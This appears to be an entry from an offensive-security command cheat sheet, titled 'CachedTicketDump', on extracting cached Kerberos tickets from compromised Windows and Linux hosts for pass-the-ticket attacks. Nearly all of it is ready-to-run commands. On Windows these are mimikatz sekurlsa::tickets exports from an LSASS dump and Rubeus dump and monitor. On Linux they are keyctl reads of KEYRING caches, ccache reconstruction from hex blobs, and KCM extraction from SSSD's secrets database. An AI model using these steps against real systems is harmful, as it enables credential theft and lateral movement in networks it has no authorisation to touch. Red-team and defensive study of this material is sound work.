---
technique: CachedTicketDump
category: credential-dumping
protocols: Kerberos
remote_capable: false
tags: kerberos tickets tgt ccache kirbi lsass dump credential-dumping ad
---

# CachedTicketDump

Kerberos tickets cached on a compromised host can be extracted and reused for pass-the-ticket (or pass-the-cache) attacks without knowing the account's password. On Linux, tickets live in FILE, DIR, KEYRING, or KCM stores depending on the krb5.conf configuration. On Windows, tickets are held in LSASS memory and can be read via raw memory access or through LSA APIs.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Local admin / elevated | Required on both Linux (for other users' tickets) and Windows |
| PPL bypass (Windows) | Rubeus uses LSA APIs and works even when LSASS is PPL-protected |
| KCM readable | SSSD secrets.ldb at `/var/lib/sss/secrets/secrets.ldb` is root-readable only |

## Windows

### Step 1: Load LSASS dump (mimikatz tickets)

#cmd #mimikatz #lsass #tickets

Point mimikatz at a previously captured LSASS memory dump to extract cached Kerberos tickets.

```cmd title:"Load LSASS dump into mimikatz for ticket extraction"
sekurlsa::minidump lsass.dmp
```
<!-- cheat -->

### Step 2: Extract Kerberos tickets (mimikatz)

#cmd #mimikatz #lsass #tickets

Extract all Kerberos tickets from the loaded LSASS dump.

```cmd title:"Extract Kerberos tickets from loaded LSASS dump with mimikatz"
sekurlsa::tickets
```
<!-- cheat -->

### Step 3: Export Kerberos tickets (mimikatz)

#cmd #mimikatz #lsass #tickets

Export Kerberos tickets from the loaded LSASS dump to kirbi files.

```cmd title:"Export Kerberos tickets from loaded LSASS dump"
sekurlsa::tickets /export
```
<!-- cheat -->

### Rubeus klist

#powershell #rubeus #tickets #lsa-api

List Kerberos tickets via LSA APIs without reading raw LSASS memory.

```powershell title:"List Kerberos tickets with Rubeus klist"
.\Rubeus.exe klist
```
<!-- cheat -->

### Rubeus triage

#powershell #rubeus #tickets #lsa-api

Triage Kerberos tickets by logon session before dumping a specific LUID.

```powershell title:"Triage Kerberos tickets with Rubeus"
.\Rubeus.exe triage
```
<!-- cheat -->

### Rubeus dump

#powershell #rubeus #tickets #lsa-api

Dump all Kerberos tickets via LSA APIs without reading raw LSASS memory.

```powershell title:"Dump all Kerberos tickets with Rubeus dump"
.\Rubeus.exe dump
```
<!-- cheat -->

### Rubeus dump LUID

#powershell #rubeus #tickets #lsa-api

Dump Kerberos tickets from a specific logon session LUID.

```powershell title:"Dump Kerberos tickets for one LUID with Rubeus"
.\Rubeus.exe dump /luid:$luid
```
<!-- cheat
var luid
-->

### Rubeus monitor

#powershell #rubeus #tickets #lsa-api

Monitor for new Kerberos tickets via LSA APIs and capture them as they are issued.

```powershell title:"Monitor for new Kerberos tickets with Rubeus monitor"
.\Rubeus.exe monitor /interval:30
```
<!-- cheat -->

## Linux

### krb5.conf default cache

#bash #native #ccache #config

Read the configured default Kerberos cache type before choosing a dump path.

```sh title:"Read default Kerberos ccache configuration"
grep -R default_ccache_name /etc/krb5.conf /etc/krb5.conf.d
```
<!-- cheat -->

### Step 1: Get KEYRING IDs (keyctl)

#bash #native #keyring #tickets

Retrieve the persistent keyring ID to locate cached Kerberos ticket blobs.

```sh title:"Get persistent KEYRING ID with keyctl"
keyctl get_persistent @u
```
<!-- cheat -->

### Step 2: Show KEYRING entries (keyctl)

#bash #native #keyring #tickets

Enumerate stored keys in the located keyring.

```sh title:"Enumerate KEYRING Kerberos ticket keys with keyctl"
keyctl show "$keyring_id"
```
<!-- cheat
var keyring_id
-->

### Step 3: Print KEYRING principals (keyctl)

#bash #native #keyring #tickets

Print the principals blob from the located KEYRING entry.

```sh title:"Print principals blob from KEYRING with keyctl"
keyctl print "$principals_address"
```
<!-- cheat
var principals_address
-->

### Step 4: Print KEYRING key data (keyctl)

#bash #native #keyring #tickets

Print the key blob from the located KEYRING entry.

```sh title:"Print key blob from KEYRING with keyctl"
keyctl print "$key_address"
```
<!-- cheat
var key_address
-->

### Step 5: Store ccache header (keyctl)

#bash #native #keyring #tickets

Store the ccache header used when rebuilding the extracted KEYRING blobs.

```sh title:"Store ccache header for KEYRING reconstruction"
HEADER='0504000c00010008ffffffff00000000'
```
<!-- cheat -->

### Step 6: Extract KEYRING principals hex (keyctl)

#bash #native #keyring #tickets

Extract the principals hex string from the located KEYRING principals blob.

```sh title:"Extract principals hex from KEYRING blob"
PRINCIPALS=$(keyctl print "$principals_address" | awk -F : '{print $3}')
```
<!-- cheat
var principals_address
-->

### Step 7: Extract KEYRING key hex (keyctl)

#bash #native #keyring #tickets

Extract the key hex string from the located KEYRING key blob.

```sh title:"Extract key hex from KEYRING blob"
KEY=$(keyctl print "$key_address" | awk -F : '{print $3}')
```
<!-- cheat
var key_address
-->

### Step 8: Reconstruct ccache from KEYRING (keyctl)

#bash #native #keyring #tickets

Reconstruct a usable ccache file from the extracted KEYRING blobs by prepending the ccache header.

```sh title:"Reconstruct ccache file from KEYRING key blobs"
echo "${HEADER}${PRINCIPALS}${KEY}" | xxd -r -p > ticket.ccache
```
<!-- cheat -->

### ccacheExtractor (KCM storage)

#python #kcm #tickets

Extract Kerberos tickets from the SSSD KCM secrets database at `/var/lib/sss/secrets/secrets.ldb`.

```sh title:"Extract KCM Kerberos tickets with ccacheExtractor"
python3 ccacheExtractor.py kcm ./secrets.ldb
```
<!-- cheat -->

### ccacheExtractor (KEYRING storage)

#python #keyring #tickets

Reconstruct a KEYRING ticket with ccacheExtractor from the extracted principals and service key blobs.

```sh title:"Reconstruct KEYRING ticket with ccacheExtractor"
python3 ccacheExtractor.py keyring --principals "$principals_hex" --key "$key_hex"
```
<!-- cheat
var principals_hex
var key_hex
-->

### KrbNixPwn

#bash #multi-storage #tickets

Automatically extract Kerberos tickets from all Linux cache types (FILE, DIR, KCM, KEYRING) in a single run.

```sh title:"Dump all Linux Kerberos tickets with KrbNixPwn"
./KrbNixPwn.sh dump
```
<!-- cheat -->

### KrbNixPwn monitor

#bash #multi-storage #tickets

Monitor Linux Kerberos cache locations for new tickets in a single run.

```sh title:"Monitor Linux Kerberos tickets with KrbNixPwn"
./KrbNixPwn.sh monitor
```
<!-- cheat -->

### klist KEYRING ticket for UID

#bash #native #keyring #multi-user

List cached Kerberos tickets for a specific UID-backed persistent KEYRING cache.

```sh title:"List KEYRING tickets for one UID"
KRB5CCNAME=KEYRING:persistent:$uid klist
```
<!-- cheat
var uid
-->
